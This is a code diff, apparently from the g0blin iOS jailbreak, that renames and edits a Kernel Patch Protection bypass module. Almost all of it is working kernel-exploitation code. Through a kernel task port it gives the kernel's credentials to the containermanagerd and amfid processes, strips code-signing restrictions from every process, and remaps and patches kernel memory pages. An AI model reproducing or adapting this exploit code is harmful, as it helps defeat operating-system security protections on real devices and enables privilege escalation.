@@ -1,5 +1,5 @@
 //
-//  kpp.m
+//  kppbypass.m
 //  g0blin
 //
 //  This is qwertyoruiop's KPP bypass, along with kernel patches.
@@ -9,7 +9,7 @@
 //  Copyright © 2017 qwertyoruiop. All rights reserved.
 //
 
-#import "kpp.h"
+#import "kppbypass.h"
 #import "offsets.h"
 #import "kernel.h"
 #import "sbops.h"
@@ -23,7 +23,7 @@
 extern task_t tfp0; // for pte_stuff.h
 
 
-kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_t self_cred, uint64_t self_proc) {
+kern_return_t do_kppbypass(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_t self_cred, uint64_t self_proc) {
     kern_return_t ret = KERN_FAILURE;
     
     tfp0 = tfpzero;
@@ -48,19 +48,26 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     uint64_t proc = ReadAnywhere64(allproc);
     while(proc) {
         uint32_t pid = ReadAnywhere32(proc + offset_p_pid);
-        
         char pname[40] = {0};
         kread(proc + offset_p_comm, pname, 20);
         
-//        if (strstr(pname, "containermanager")) {
-//            printf("[INFO]: found containermanagerd, giving it kern creds \n");
-//            WriteAnywhere64(proc + offset_p_cred, kern_cred);
-//        }
+//------------------------------------------------------------------------------
+//TEST
+        
+        if (strstr(pname, "containermanager")) {
+            printf("[INFO]: found containermanagerd, giving it kern creds \n");
+            WriteAnywhere64(proc + offset_p_cred, kern_cred);
+        }
+        if (strstr(pname, "amfi")) {
+            printf("[INFO]: found amfid, giving it kern creds \n");
+            WriteAnywhere64(proc + offset_p_cred, kern_cred);
+        }
+        
+//------------------------------------------------------------------------------
         
         if (pid > 0) {
             uint32_t csflags = ReadAnywhere32(proc + offset_p_csflags);
-//            csflags |= CS_VALID|CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
-//            csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
+            //csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW|CS_VALID;
             csflags |= CS_PLATFORM_BINARY|CS_INSTALLER|CS_GET_TASK_ALLOW;
             csflags &= ~(CS_RESTRICT|CS_KILL|CS_HARD);
             WriteAnywhere32(proc + offset_p_csflags, csflags);
@@ -80,6 +87,7 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
 
     gPhysBase = ReadAnywhere64(gStoreBase);
     printf("[INFO]: gPhysBase = %llx \n", gPhysBase);
+    
     gVirtBase = ReadAnywhere64(gStoreBase+8);
     printf("[INFO]: gVirtBase = %llx \n", gVirtBase);
     
@@ -97,11 +105,13 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
     
     uint64_t cpu_list = ReadAnywhere64(cpul - 0x10 /*the add 0x10, 0x10 instruction confuses findregval*/) - gPhysBase + gVirtBase;
     printf("[INFO]: cpu_list = %llx \n", cpu_list);
+    
     uint64_t cpu = ReadAnywhere64(cpu_list);
     printf("[INFO]: cpu = %llx \n", cpu);
     
     uint64_t pmap_store = find_kernel_pmap();
     printf("[INFO]: pmap = %llx \n", pmap_store);
+    
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
     printf("[INFO]: level1_table = %llx \n", level1_table);
     
@@ -183,7 +193,6 @@ kern_return_t do_kpp(task_t tfpzero, uint64_t slide, uint64_t kern_cred, uint64_
         cpu_list += 0x10;
         cpu = ReadAnywhere64(cpu_list);
     }
-    
     
     uint64_t shc = physalloc(0x4000);
     
@@ -424,7 +433,6 @@ remappage[remapcnt++] = (x & (~PMK));\
 	
     RemapPage(memcmp_got);
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
-	
     
     uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
     printf("[INFO]: fref at %llx\n", fref);
